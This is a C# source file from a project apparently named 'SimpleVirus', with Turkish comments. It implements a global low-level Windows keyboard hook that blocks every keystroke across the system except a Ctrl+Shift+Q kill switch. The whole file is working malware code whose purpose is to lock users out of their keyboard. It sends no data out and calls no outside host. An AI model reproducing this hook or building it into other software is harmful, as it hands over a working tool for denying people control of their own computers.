using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace SimpleVirus
{
    public class KeyboardHook : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;

        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;
        private bool _ctrlPressed = false;
        private bool _shiftPressed = false;
        private bool _qPressed = false;

        public event EventHandler KillSwitchPressed;

        public KeyboardHook()
        {
            _proc = HookCallback;
        }

        public void Install()
        {
            _hookID = SetHook(_proc);
        }

        public void Uninstall()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                // Kill switch kontrolü: Ctrl+Shift+Q
                if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)
                {
                    if (key == Keys.LControlKey || key == Keys.RControlKey)
                    {
                        _ctrlPressed = true;
                    }
                    else if (key == Keys.LShiftKey || key == Keys.RShiftKey)
                    {
                        _shiftPressed = true;
                    }
                    else if (key == Keys.Q)
                    {
                        _qPressed = true;
                    }

                    // Kill switch kontrolü
                    if (_ctrlPressed && _shiftPressed && _qPressed)
                    {
                        KillSwitchPressed?.Invoke(this, EventArgs.Empty);
                        return (IntPtr)1; // Tuşu engelle ama kill switch'i çalıştır
                    }
                }

                if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP)
                {
                    if (key == Keys.LControlKey || key == Keys.RControlKey)
                    {
                        _ctrlPressed = false;
                    }
                    else if (key == Keys.LShiftKey || key == Keys.RShiftKey)
                    {
                        _shiftPressed = false;
                    }
                    else if (key == Keys.Q)
                    {
                        _qPressed = false;
                    }
                }

                // Diğer tüm tuşları engelle (kill switch hariç)
                if (!(_ctrlPressed && _shiftPressed && _qPressed))
                {
                    return (IntPtr)1; // Tuşu engelle
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public void Dispose()
        {
            Uninstall();
        }
    }
}


